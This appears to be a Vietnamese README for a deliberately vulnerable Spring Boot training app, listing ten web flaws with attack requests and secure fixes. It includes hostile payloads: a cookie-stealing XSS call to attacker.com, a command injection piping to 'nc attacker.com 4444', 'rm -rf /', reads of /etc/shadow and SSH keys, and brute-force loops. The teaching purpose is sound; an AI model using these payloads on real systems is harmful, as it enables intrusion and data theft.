# Security Standards Demo - Ứng Dụng Code Không An Toàn

⚠️ **CẢNH BÁO QUAN TRỌNG** ⚠️

Đây là ứng dụng demo với **nhiều lỗi bảo mật nghiêm trọng** được tạo ra **CHỈ** cho mục đích giáo dục.

**KHÔNG BAO GIỜ** sử dụng code này trong môi trường production hoặc bất kỳ ứng dụng thực tế nào!

---

## 🎯 Mục Đích

Demo này minh họa các lỗi bảo mật phổ biến để giúp developers:
1. **Nhận biết** các lỗi bảo mật thường gặp
2. **Hiểu rõ** tầm quan trọng của secure coding standards
3. **Học cách** phát hiện và tránh các lỗi tương tự
4. **Thực hành** security testing và code review

---

## 📋 Danh Sách Các Lỗi Bảo Mật

### 1. SQL INJECTION (CWE-89) ❌

**File:** `SqlInjectionController.java`

#### Lỗi:
- Concatenate user input trực tiếp vào SQL query
- Không sử dụng Prepared Statements
- Không validate/sanitize input

#### Ví dụ tấn công:
```bash
# Bypass authentication
GET /api/insecure/login?username=admin'--&password=anything

# Lấy tất cả data
GET /api/insecure/search?name=admin' OR '1'='1

# Xóa toàn bộ database
GET /api/insecure/delete?userId=1 OR 1=1

# Data exfiltration
GET /api/insecure/search?name=' UNION SELECT password FROM users--
```

#### Hậu quả:
- 🔴 **CRITICAL**: Attacker có thể đọc toàn bộ database
- 🔴 **CRITICAL**: Xóa hoặc modify data
- 🔴 **CRITICAL**: Bypass authentication
- 🔴 **CRITICAL**: Execute arbitrary SQL commands

#### Chuẩn vi phạm:
- OWASP Top 10 (A03:2021 - Injection)
- CWE-89: SQL Injection
- PCI DSS Requirement 6.5.1

#### Cách fix đúng:
```java
// ✅ ĐÚNG: Sử dụng Prepared Statement
String sql = "SELECT * FROM users WHERE name LIKE ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, "%" + name + "%");
ResultSet rs = pstmt.executeQuery();
```

---

### 2. CROSS-SITE SCRIPTING (XSS) - CWE-79 ❌

**File:** `XssController.java`

#### Lỗi:
- Return user input trực tiếp không encode
- Không sanitize HTML/JavaScript
- Reflected và Stored XSS

#### Ví dụ tấn công:
```bash
# Reflected XSS
GET /api/insecure/hello?name=<script>alert('XSS')</script>

# Stored XSS
POST /api/insecure/comment
{
  "comment": "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
}

# HTML Injection
GET /api/insecure/profile?bio=<h1>Hacked!</h1><iframe src="evil.com">
```

#### Hậu quả:
- 🔴 **HIGH**: Steal user cookies/session tokens
- 🔴 **HIGH**: Redirect users đến malicious sites
- 🔴 **HIGH**: Modify page content
- 🔴 **HIGH**: Keylogging và credential theft

#### Chuẩn vi phạm:
- OWASP Top 10 (A03:2021 - Injection)
- CWE-79: Cross-site Scripting
- PCI DSS Requirement 6.5.7

#### Cách fix đúng:
```java
// ✅ ĐÚNG: Encode output
import org.springframework.web.util.HtmlUtils;

String safeName = HtmlUtils.htmlEscape(name);
return "<html><body><h1>Hello " + safeName + "!</h1></body></html>";

// Hoặc sử dụng template engine (Thymeleaf, etc.)
```

---

### 3. PATH TRAVERSAL (CWE-22) ❌

**File:** `XssController.java` - `readFile()` method

#### Lỗi:
- Accept user input để chỉ định file path
- Không validate/sanitize path
- Cho phép "../" sequences

#### Ví dụ tấn công:
```bash
# Đọc sensitive files
GET /api/insecure/file?path=../../etc/passwd
GET /api/insecure/file?path=../../etc/shadow
GET /api/insecure/file?path=../../../application.properties
GET /api/insecure/file?path=../../.ssh/id_rsa
```

#### Hậu quả:
- 🔴 **CRITICAL**: Đọc bất kỳ file nào trên server
- 🔴 **CRITICAL**: Access credentials và config files
- 🔴 **CRITICAL**: Đọc source code
- 🔴 **CRITICAL**: Access SSH keys

#### Chuẩn vi phạm:
- OWASP Top 10 (A01:2021 - Broken Access Control)
- CWE-22: Path Traversal
- CWE-23: Relative Path Traversal

#### Cách fix đúng:
```java
// ✅ ĐÚNG: Validate và restrict path
Path basePath = Paths.get("/safe/directory/");
Path requestedPath = basePath.resolve(filename).normalize();

// Check if resolved path starts with base path
if (!requestedPath.startsWith(basePath)) {
    throw new SecurityException("Invalid path");
}
```

---

### 4. COMMAND INJECTION (CWE-78) ❌

**File:** `XssController.java` - `ping()` method

#### Lỗi:
- Execute system commands với user input
- Không validate command parameters
- Sử dụng Runtime.exec() với unsanitized input

#### Ví dụ tấn công:
```bash
# Execute arbitrary commands
GET /api/insecure/ping?host=google.com;cat /etc/passwd
GET /api/insecure/ping?host=google.com && rm -rf /
GET /api/insecure/ping?host=google.com | nc attacker.com 4444
GET /api/insecure/ping?host=`whoami`
```

#### Hậu quả:
- 🔴 **CRITICAL**: Remote Code Execution (RCE)
- 🔴 **CRITICAL**: Full server compromise
- 🔴 **CRITICAL**: Data theft
- 🔴 **CRITICAL**: Malware installation

#### Chuẩn vi phạm:
- OWASP Top 10 (A03:2021 - Injection)
- CWE-78: OS Command Injection
- SANS Top 25 #2

#### Cách fix đúng:
```java
// ✅ ĐÚNG: Không execute user input
// Nếu cần thiết, validate strictly và use ProcessBuilder
if (!host.matches("^[a-zA-Z0-9.-]+$")) {
    throw new IllegalArgumentException("Invalid host");
}

ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", host);
Process process = pb.start();
```

---

### 5. INSECURE DESERIALIZATION (CWE-502) ❌

**File:** `XssController.java` - `deserialize()` method

#### Lỗi:
- Deserialize untrusted data
- Không validate serialized objects
- Có thể dẫn đến Remote Code Execution

#### Ví dụ tấn công:
```bash
# Sử dụng ysoserial để generate malicious payload
java -jar ysoserial.jar CommonsCollections1 "rm -rf /" | base64

POST /api/insecure/deserialize
[base64-encoded-malicious-payload]
```

#### Hậu quả:
- 🔴 **CRITICAL**: Remote Code Execution
- 🔴 **CRITICAL**: Full system compromise
- 🔴 **CRITICAL**: Data breach

#### Chuẩn vi phạm:
- OWASP Top 10 (A08:2021 - Software and Data Integrity Failures)
- CWE-502: Deserialization of Untrusted Data

#### Cách fix đúng:
```java
// ✅ ĐÚNG: Không deserialize untrusted data
// Sử dụng JSON/XML thay vì Java serialization
// Nếu cần thiết, implement whitelist của allowed classes
```

---

### 6. BROKEN AUTHENTICATION (CWE-287) ❌

**File:** `AuthController.java`

#### Lỗi:
- Lưu password dạng plaintext
- Sử dụng weak hashing (MD5) không salt
- Không có rate limiting (brute force)
- Predictable session IDs
- Không có account lockout
- Missing authentication checks

#### Ví dụ tấn công:
```bash
# Brute force attack (no rate limiting)
for i in {1..10000}; do
  curl "http://localhost:8080/api/insecure/auth/login" \
    -d '{"username":"admin","password":"pass'$i'"}'
done

# Session prediction
# Sessions có format: SESSION_[timestamp]
# Attacker có thể đoán được

# Access admin endpoints without authentication
GET /api/insecure/auth/admin/users
```

#### Hậu quả:
- 🔴 **CRITICAL**: Account takeover
- 🔴 **CRITICAL**: Unauthorized access
- 🔴 **CRITICAL**: Password leaks
- 🔴 **HIGH**: Brute force attacks thành công

#### Chuẩn vi phạm:
- OWASP Top 10 (A07:2021 - Identification and Authentication Failures)
- CWE-259: Hard-coded Password
- CWE-327: Use of Broken Crypto Algorithm
- CWE-759: No Salt in Password Hash

#### Cách fix đúng:
```java
// ✅ ĐÚNG: Sử dụng BCrypt với salt
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);
String hashedPassword = encoder.encode(plainPassword);

// ✅ ĐÚNG: Verify password
boolean matches = encoder.matches(plainPassword, hashedPassword);

// ✅ ĐÚNG: Rate limiting
// Sử dụng libraries như Bucket4j, RateLimiter

// ✅ ĐÚNG: Secure session IDs
// Sử dụng Spring Security hoặc generate crypto-random UUIDs
```

---

### 7. HARDCODED CREDENTIALS (CWE-798) ❌

**Files:**
- `SensitiveDataController.java`
- `application.properties`

#### Lỗi:
- Database credentials trong source code
- API keys hardcoded
- Encryption keys trong code
- JWT secrets hardcoded

#### Ví dụ:
```java
// ❌ NGUY HIỂM
private static final String DB_PASSWORD = "SuperSecret123!";
private static final String AWS_SECRET_KEY = "wJalrXUtnFEMI/...";
```

#### Hậu quả:
- 🔴 **CRITICAL**: Source code leak = credential leak
- 🔴 **CRITICAL**: Git history chứa credentials
- 🔴 **CRITICAL**: Attacker có full access

#### Chuẩn vi phạm:
- OWASP Top 10 (A05:2021 - Security Misconfiguration)
- CWE-798: Use of Hard-coded Credentials
- CWE-321: Use of Hard-coded Cryptographic Key

#### Cách fix đúng:
```java
// ✅ ĐÚNG: Sử dụng environment variables
String dbPassword = System.getenv("DB_PASSWORD");

// ✅ ĐÚNG: Sử dụng external config
@Value("${database.password}")
private String dbPassword;

// ✅ ĐÚNG: Sử dụng secrets management
// - AWS Secrets Manager
// - HashiCorp Vault
// - Azure Key Vault
```

---

### 8. SENSITIVE DATA EXPOSURE (CWE-200) ❌

**File:** `SensitiveDataController.java`

#### Lỗi:
- Return passwords trong API responses
- Expose database credentials
- Detailed error messages
- Log sensitive information
- Expose system configuration

#### Ví dụ:
```bash
# Get all credentials
GET /api/insecure/data/db-config
GET /api/insecure/data/api-keys

# Get sensitive user data
GET /api/insecure/data/user/123
# Returns: SSN, credit card, password, etc.

# Debug endpoint
GET /api/insecure/data/debug/config
# Returns: ALL system secrets
```

#### Hậu quả:
- 🔴 **CRITICAL**: Full credential exposure
- 🔴 **CRITICAL**: Identity theft
- 🔴 **HIGH**: Privacy violations
- 🔴 **HIGH**: Regulatory compliance violations (GDPR, PCI DSS)

#### Chuẩn vi phạm:
- OWASP Top 10 (A02:2021 - Cryptographic Failures)
- CWE-200: Information Exposure
- CWE-532: Information Exposure Through Log Files
- PCI DSS Requirement 3 (Protect Stored Cardholder Data)
- GDPR Article 32 (Security of Processing)

#### Cách fix đúng:
```java
// ✅ ĐÚNG: Không return sensitive data
public UserDTO getUser(String id) {
    User user = userRepository.findById(id);
    // Map to DTO without sensitive fields
    return new UserDTO(user.getId(), user.getName(), user.getEmail());
    // NO password, SSN, credit card, etc.
}

// ✅ ĐÚNG: Mask sensitive data in logs
logger.info("Processing payment for card: " + maskCardNumber(cardNumber));
```

---

### 9. MISSING INPUT VALIDATION (CWE-20) ❌

**File:** `XssController.java` - `transferMoney()` method

#### Lỗi:
- Không validate input type
- Không check ranges/limits
- Accept negative numbers
- Không validate format

#### Ví dụ tấn công:
```bash
POST /api/insecure/transfer
{
  "amount": -1000000,  # Negative amount
  "toAccount": "attacker"
}

POST /api/insecure/transfer
{
  "amount": 999999999999,  # Exceeds limit
  "toAccount": "attacker"
}

POST /api/insecure/transfer
{
  "amount": "not a number",  # Invalid type
  "toAccount": "'; DROP TABLE accounts; --"
}
```

#### Hậu quả:
- 🔴 **HIGH**: Business logic bypass
- 🔴 **HIGH**: Financial fraud
- 🔴 **MEDIUM**: Data corruption

#### Chuẩn vi phạm:
- OWASP Top 10 (A03:2021 - Injection)
- CWE-20: Improper Input Validation

#### Cách fix đúng:
```java
// ✅ ĐÚNG: Validate all inputs
if (amount <= 0 || amount > MAX_TRANSFER_LIMIT) {
    throw new ValidationException("Invalid amount");
}

if (!isValidAccountNumber(toAccount)) {
    throw new ValidationException("Invalid account");
}

if (amount > userBalance) {
    throw new ValidationException("Insufficient funds");
}
```

---

### 10. MISSING AUTHORIZATION (CWE-862) ❌

**Files:**
- `AuthController.java` - `getAllUsers()`, `deleteUser()`
- `SensitiveDataController.java` - `getUserDetails()`

#### Lỗi:
- Không check user permissions
- Missing role-based access control
- Bất kỳ user nào cũng có thể:
  - Xem danh sách tất cả users
  - Xóa users khác (kể cả admin)
  - Xem sensitive data của users khác

#### Ví dụ tấn công:
```bash
# Regular user có thể xem tất cả users
GET /api/insecure/auth/admin/users

# User có thể xóa admin
DELETE /api/insecure/auth/user/admin?sessionId=USER_SESSION

# User có thể xem data của users khác
GET /api/insecure/data/user/other_user_id
```

#### Hậu quả:
- 🔴 **CRITICAL**: Privilege escalation
- 🔴 **CRITICAL**: Unauthorized data access
- 🔴 **HIGH**: Account deletion by unauthorized users

#### Chuẩn vi phạm:
- OWASP Top 10 (A01:2021 - Broken Access Control)
- CWE-862: Missing Authorization

#### Cách fix đúng:
```java
// ✅ ĐÚNG: Check authorization
@PreAuthorize("hasRole('ADMIN')")
public List<User> getAllUsers() {
    // Only admin can access
}

// ✅ ĐÚNG: Check ownership
public User getUserDetails(String userId, Authentication auth) {
    if (!userId.equals(auth.getUserId()) && !auth.hasRole("ADMIN")) {
        throw new AccessDeniedException("Not authorized");
    }
    // ...
}
```

---

## 🚀 Cách Chạy Demo

### Prerequisites:
- Java 11+
- Maven 3.6+

### Build và Run:
```bash
cd security-standards-demo

# Build
mvn clean package

# Run
mvn spring-boot:run

# Hoặc
java -jar target/insecure-demo-1.0.0.jar
```

Application sẽ start tại: `http://localhost:8080`

---

## 🧪 Test Các Vulnerabilities

### 1. Test SQL Injection:
```bash
# Normal search
curl "http://localhost:8080/api/insecure/search?name=admin"

# SQL Injection - bypass filter
curl "http://localhost:8080/api/insecure/search?name=admin' OR '1'='1"

# SQL Injection - login bypass
curl "http://localhost:8080/api/insecure/login?username=admin'--&password=anything"
```

### 2. Test XSS:
```bash
# Reflected XSS
curl "http://localhost:8080/api/insecure/hello?name=<script>alert('XSS')</script>"

# Stored XSS
curl -X POST http://localhost:8080/api/insecure/comment \
  -H "Content-Type: application/json" \
  -d '{"comment":"<script>alert(document.cookie)</script>"}'
```

### 3. Test Path Traversal:
```bash
# Try to read /etc/passwd (Linux)
curl "http://localhost:8080/api/insecure/file?path=../../etc/passwd"

# Try to read application.properties
curl "http://localhost:8080/api/insecure/file?path=../resources/application.properties"
```

### 4. Test Command Injection:
```bash
# Normal ping
curl "http://localhost:8080/api/insecure/ping?host=google.com"

# Command injection
curl "http://localhost:8080/api/insecure/ping?host=google.com;whoami"
```

### 5. Test Authentication Issues:
```bash
# Brute force (no rate limiting)
for i in {1..100}; do
  curl -X POST http://localhost:8080/api/insecure/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"pass$i\"}"
done

# Access admin endpoint without auth
curl http://localhost:8080/api/insecure/auth/admin/users
```

### 6. Test Sensitive Data Exposure:
```bash
# Get database credentials
curl http://localhost:8080/api/insecure/data/db-config

# Get API keys
curl http://localhost:8080/api/insecure/data/api-keys

# Get debug config
curl http://localhost:8080/api/insecure/data/debug/config
```

---

## 📚 Secure Coding Standards

### OWASP Top 10 (2021):
1. ✅ **A01 - Broken Access Control**
2. ✅ **A02 - Cryptographic Failures**
3. ✅ **A03 - Injection**
4. **A04 - Insecure Design**
5. ✅ **A05 - Security Misconfiguration**
6. **A06 - Vulnerable and Outdated Components**
7. ✅ **A07 - Identification and Authentication Failures**
8. ✅ **A08 - Software and Data Integrity Failures**
9. **A09 - Security Logging and Monitoring Failures**
10. **A10 - Server-Side Request Forgery (SSRF)**

### CWE Top 25:
- ✅ CWE-89: SQL Injection
- ✅ CWE-79: XSS
- ✅ CWE-78: OS Command Injection
- ✅ CWE-20: Improper Input Validation
- ✅ CWE-22: Path Traversal
- ✅ CWE-502: Deserialization
- ✅ CWE-798: Hard-coded Credentials
- ✅ CWE-287: Improper Authentication
- ✅ CWE-862: Missing Authorization

---

## 🛡️ Các Biện Pháp Phòng Chống

### 1. Input Validation:
- ✅ Validate tất cả user input
- ✅ Use whitelist, không phải blacklist
- ✅ Validate type, format, length, range
- ✅ Sanitize và encode output

### 2. Parameterized Queries:
- ✅ Luôn sử dụng Prepared Statements
- ✅ Không concatenate SQL strings
- ✅ Sử dụng ORM (JPA, Hibernate) correctly

### 3. Authentication & Authorization:
- ✅ Sử dụng strong password hashing (BCrypt, Argon2)
- ✅ Implement rate limiting
- ✅ Use secure session management
- ✅ Check authorization ở mọi endpoint
- ✅ Implement RBAC (Role-Based Access Control)

### 4. Secrets Management:
- ✅ Không hardcode credentials
- ✅ Use environment variables
- ✅ Use secrets management tools
- ✅ Rotate keys regularly

### 5. Error Handling:
- ✅ Không expose detailed errors
- ✅ Log errors securely
- ✅ Use generic error messages

### 6. Security Headers:
- ✅ Content-Security-Policy
- ✅ X-Frame-Options
- ✅ X-Content-Type-Options
- ✅ Strict-Transport-Security

### 7. Logging:
- ✅ Không log sensitive data
- ✅ Log security events
- ✅ Mask PII trong logs

---

## 📖 Tài Liệu Tham Khảo

### Standards:
- [OWASP Top 10](https://owasp.org/Top10/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [SANS Top 25](https://www.sans.org/top25-software-errors/)

### Tools:
- **SAST**: SonarQube, Checkmarx, Fortify
- **DAST**: OWASP ZAP, Burp Suite
- **Dependency Check**: OWASP Dependency Check, Snyk

### Learning:
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

## ⚠️ Disclaimer

Code trong project này chứa **LỖI BẢO MẬT NGHIÊM TRỌNG** và được tạo **CHỈ** cho mục đích giáo dục.

**KHÔNG:**
- ❌ Sử dụng code này trong production
- ❌ Copy/paste code này vào projects thực tế
- ❌ Deploy application này lên internet
- ❌ Sử dụng cho mục đích tấn công

**NÊN:**
- ✅ Học và hiểu các lỗi bảo mật
- ✅ Thực hành phát hiện vulnerabilities
- ✅ Áp dụng secure coding practices
- ✅ Review code để tìm similar issues

---

## 📝 Kết Luận

Security không phải là optional - đó là **BẮT BUỘC**!

Các lỗi trong demo này rất phổ biến trong real-world applications và có thể dẫn đến:
- 💰 Financial losses
- 📰 Data breaches
- ⚖️ Legal consequences
- 😞 Loss of customer trust

**Hãy luôn:**
1. Follow secure coding standards
2. Validate và sanitize ALL inputs
3. Use security libraries và frameworks
4. Keep dependencies updated
5. Perform regular security testing
6. Code review với security mindset

---

**Happy Learning! 🎓**

*Remember: The best time to fix security issues is BEFORE they reach production!*
